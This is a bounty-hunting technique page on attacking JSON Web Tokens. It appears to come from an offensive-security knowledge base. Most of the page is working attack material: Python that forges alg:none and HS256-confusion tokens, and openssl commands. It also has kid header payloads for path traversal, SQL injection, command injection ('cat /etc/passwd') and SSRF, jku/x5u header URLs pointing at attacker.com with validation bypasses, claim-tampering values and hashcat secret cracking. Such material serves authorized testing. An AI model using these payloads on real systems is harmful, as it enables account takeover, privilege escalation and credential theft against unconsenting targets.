---
id: "jwt-deep-dive"
title: "JWT Attack Techniques Deep Dive"
type: "technique"
category: "web-application"
subcategory: "authentication"
tags: ["jwt", "json-web-token", "algorithm-confusion", "kid-injection", "jku", "jwk", "none-algorithm", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["oauth-jwt-saml-bypasses", "auth-bypass-payloads", "mfa-bypass"]
difficulty: "advanced"
updated: "2026-04-14"
---

# JWT Attack Techniques Deep Dive

## Why JWT Attacks Pay Well
JWTs are used everywhere for authentication and authorization. A JWT bypass means instant account takeover or privilege escalation. Bounties: $5k–$50k+ depending on impact.

## JWT Structure
```
HEADER.PAYLOAD.SIGNATURE

# Header: {"alg": "RS256", "typ": "JWT", "kid": "key-1"}
# Payload: {"sub": "user123", "role": "user", "exp": 1700000000}
# Signature: HMAC or RSA signature of header.payload
```

## Attack Techniques

### 1. Algorithm None Attack
```
# Change algorithm to "none" — signature not verified

# Original header:
{"alg": "RS256", "typ": "JWT"}

# Modified header:
{"alg": "none", "typ": "JWT"}
{"alg": "None", "typ": "JWT"}
{"alg": "NONE", "typ": "JWT"}
{"alg": "nOnE", "typ": "JWT"}

# Create token:
# base64url(header) + "." + base64url(payload) + "."
# Note: trailing dot, no signature

# Python:
import base64, json
header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=')
token = header.decode() + "." + payload.decode() + "."
print(token)
```

### 2. Algorithm Confusion (RS256 → HS256)
```
# If server uses RS256 (asymmetric), but also accepts HS256 (symmetric):
# Sign the token with the PUBLIC key using HMAC
# Server verifies HMAC signature using the public key as the secret

# Step 1: Get the public key
# From: /.well-known/jwks.json, /api/keys, certificate, etc.
openssl s_client -connect target.com:443 | openssl x509 -pubkey -noout > public.pem

# Step 2: Create HS256 token signed with public key
import jwt
public_key = open("public.pem").read()
token = jwt.encode(
    {"sub": "admin", "role": "admin"},
    public_key,
    algorithm="HS256"
)

# Step 3: Send token — server uses public key to verify HS256 → matches!
```

### 3. Key ID (kid) Injection
```
# "kid" (Key ID) header tells server which key to use for verification
# If kid is used in a file path or database query → injection

# Directory traversal:
{"alg": "HS256", "kid": "../../../dev/null"}
# Server reads /dev/null as key → empty key → sign with empty string

{"alg": "HS256", "kid": "../../etc/hostname"}
# Server uses hostname content as HMAC key → predictable!

# SQL injection in kid:
{"alg": "HS256", "kid": "key1' UNION SELECT 'my-secret-key' -- "}
# Server queries: SELECT key FROM keys WHERE kid = 'key1' UNION SELECT 'my-secret-key' --'
# Returns 'my-secret-key' → sign token with that value

# Command injection:
{"alg": "HS256", "kid": "key1|cat /etc/passwd"}
# If kid is used in exec() or system() call

# SSRF via kid:
{"alg": "HS256", "kid": "http://attacker.com/key"}
# Server fetches key from attacker-controlled URL
```

### 4. JKU (JWK Set URL) Injection
```
# "jku" header specifies URL to fetch the public key
# If server trusts the jku URL without validation:

# Step 1: Generate your own RSA key pair
openssl genrsa -out attacker.pem 2048
openssl rsa -in attacker.pem -pubout -out attacker-pub.pem

# Step 2: Create JWK Set and host on your server
# attacker.com/.well-known/jwks.json:
{
  "keys": [{
    "kty": "RSA",
    "kid": "attacker-key",
    "use": "sig",
    "n": "BASE64_MODULUS",
    "e": "AQAB"
  }]
}

# Step 3: Create JWT with jku pointing to your server
{"alg": "RS256", "jku": "https://attacker.com/.well-known/jwks.json", "kid": "attacker-key"}

# Sign with YOUR private key → server fetches YOUR public key → valid!

# Bypass URL validation:
"jku": "https://target.com@attacker.com/.well-known/jwks.json"
"jku": "https://target.com/.well-known/jwks.json/../../../attacker.com/jwks.json"
"jku": "https://attacker.com/jwks.json#target.com"
"jku": "https://attacker.com/.well-known/jwks.json?.target.com"
```

### 5. X5U (X.509 Certificate URL) Injection
```
# Similar to JKU but with X.509 certificates
# "x5u" header points to certificate chain URL

# Step 1: Generate self-signed cert with your key
openssl req -x509 -nodes -newkey rsa:2048 \
  -keyout attacker.key -out attacker.crt \
  -subj "/CN=attacker"

# Step 2: Host certificate at your URL
# Step 3: Set x5u to your URL in JWT header
{"alg": "RS256", "x5u": "https://attacker.com/cert.pem"}

# Sign with attacker.key → server fetches attacker.crt → valid!
```

### 6. JWK Embedded Key Attack
```
# "jwk" header embeds the public key directly in the token
# If server trusts the embedded key:

# Step 1: Generate key pair
from cryptography.hazmat.primitives.asymmetric import rsa
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

# Step 2: Embed public key in JWT header
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "YOUR_MODULUS",
    "e": "AQAB"
  }
}

# Step 3: Sign with your private key
# Server extracts public key from header → verifies against it → valid!
# You literally tell the server which key to use to verify YOUR signature
```

### 7. Signature Stripping
```
# Some libraries accept tokens without signature when alg is present
# Try removing the signature entirely:

# Original: header.payload.signature
# Modified: header.payload.
# Modified: header.payload

# Or empty signature:
# header.payload.AA==
```

### 8. Claim Manipulation
```
# After bypassing signature verification, modify claims:

# Privilege escalation:
{"role": "admin"}
{"role": "administrator"}
{"is_admin": true}
{"permissions": ["*"]}
{"group": "superusers"}

# Account takeover:
{"sub": "victim_user_id"}
{"email": "victim@target.com"}
{"user_id": 1}   # Often admin is user_id 1

# Expiration bypass:
{"exp": 9999999999}   # Year 2286
{"exp": null}          # Some libraries skip check if null
# Remove "exp" claim entirely

# Audience/issuer manipulation:
{"aud": "admin-portal"}
{"iss": "internal-auth-service"}
```

### 9. Cross-Service Token Confusion
```
# If multiple services share the same JWT signing key:
# Token from Service A accepted by Service B

# Example:
# 1. Get JWT from low-privilege API (read-only service)
# 2. Present it to admin API (if same key is used)
# 3. Claims from low-priv token work on high-priv service

# Also: Staging vs Production key reuse
# Get token from staging.target.com → use on target.com
```

### 10. Weak Secret Brute Force (HMAC)
```bash
# If algorithm is HS256/HS384/HS512, brute force the secret:

# Using jwt_tool:
python3 jwt_tool.py <TOKEN> -C -d /path/to/wordlist.txt

# Using hashcat:
hashcat -m 16500 jwt_hash.txt /path/to/wordlist.txt

# Common weak secrets:
# secret, password, 123456, your-256-bit-secret (from jwt.io)
# Company name, app name, environment name

# If secret is found: forge any token with any claims
```

## Deep Dig Prompts
```
Given this JWT [paste token]:
1. Decode header and payload (jwt.io or base64 decode)
2. Check algorithm (RS256 → try HS256 confusion, HS256 → try brute force)
3. Check for kid, jku, x5u, jwk headers (injection vectors)
4. Try algorithm:none with various casings
5. Look for public key (/.well-known/jwks.json, certificates)
6. Test claim manipulation after finding a signature bypass
7. Check cross-service token acceptance
```

## Tools
- jwt_tool (comprehensive JWT testing)
- jwt.io (decode/encode)
- hashcat -m 16500 (HMAC brute force)
- Burp JWT Editor extension
- python-jwt / PyJWT library

## Key Locations for Public Keys
```
/.well-known/jwks.json
/.well-known/openid-configuration
/api/keys
/api/v1/keys
/oauth/token_keys
/oauth2/jwks
/certs
/.pem
TLS certificate (openssl s_client)
```
